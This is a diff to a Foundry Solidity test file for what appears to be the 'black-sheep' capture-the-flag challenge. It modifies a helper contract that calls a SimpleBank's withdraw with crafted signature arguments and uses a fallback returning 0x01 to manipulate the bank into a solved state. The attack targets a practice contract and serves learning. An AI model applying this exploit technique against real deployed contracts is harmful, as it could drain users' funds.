@@ -4,28 +4,34 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "../src/black-sheep/Challenge.sol";
 
-contract ChallengeHelper {
+contract ChallengeHelper is Test {
     ISimpleBank public immutable BANK;
 
     constructor(ISimpleBank bank) {
         BANK = bank;
     }
 
+    uint public count = 0;
+
     function deposit() public payable {}
 
     function withDraw() public payable {
-        BANK.withdraw{value: 1}(
-            keccak256("dumb"),
-            27,
-            keccak256("fasdfsdafsdfsd"),
-            keccak256("sdafasdfasdfsdf")
+        bytes32 digest = keccak256(abi.encodePacked("dumb"));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            vm.envUint("PRIVATE_KEY"),
+            digest
         );
+
+        BANK.withdraw{value: 1}(0, 0, 0, 0);
     }
 
-    fallback(bytes calldata) external returns (bytes memory) {
-        bytes memory bytesArray = new bytes(1);
-        bytesArray[0] = bytes1(0x01);
-        return bytesArray;
+    fallback(bytes calldata data) external payable returns (bytes memory) {
+        if (msg.value == 2) {
+            revert("fallback");
+        } else {
+            bytes memory returndata = hex"01";
+            return returndata;
+        }
     }
 
     function isSolved() external view returns (bool) {
@@ -50,6 +56,7 @@ contract ContractTest is Test {
     // console.log("address(challenge)", address(challenge));
     // console.log("address(bank)", address(bank));
     // console.log("address(helper)", address(helper));
+
     //0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496 = test contract logic
     //0x7F9fc124E28E6c35258f24eB27526e661E88128B = challenge contract logic
     //0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38 = msg.sender
@@ -62,6 +69,6 @@ contract ContractTest is Test {
 
         vm.prank(sender);
         helper.withDraw();
-        console.log(challenge.isSolved());
+        console.log(helper.isSolved());
     }
 }
